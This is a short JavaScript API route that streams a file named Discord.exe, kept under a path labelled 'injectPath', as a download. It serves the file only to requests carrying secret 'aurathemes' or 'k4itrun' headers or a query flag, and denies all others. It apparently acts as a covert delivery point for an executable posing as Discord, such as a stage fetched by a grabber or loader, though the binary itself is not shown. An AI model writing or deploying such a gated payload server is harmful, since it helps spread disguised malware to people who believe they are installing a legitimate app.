import path from 'path';
import fs from 'fs';

const injectPath = 'src/files/scripts/raws/exes/Discord.exe';

export default async function handler(req, res) {
  try {
    if (req.headers['aurathemes'] === 'true' || req.headers['k4itrun'] === 'true' || req.query.aurathemes === 'true') {
      const filePath = path.join(process.cwd(), injectPath);

      if (fs.existsSync(filePath)) {
        const fileStream = fs.createReadStream(filePath);

        res.setHeader('Content-Type', 'application/octet-stream');
        res.setHeader('Content-Disposition', `attachment; filename=${path.basename(filePath)}`);

        fileStream.pipe(res);

        fileStream.on('end', () => {
          console.log('ok');
          res.end();
        });

        fileStream.on('error', (err) => {
          console.error('Error reading file:', err);
          res.status(500).end();
        });
      } else {
        res.status(404).json({ error: 'File not found.' });
      }
    } else {
      res.status(403).json({ error: 'Access denied.' });
    }
  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal Server Error.' });
  }
}
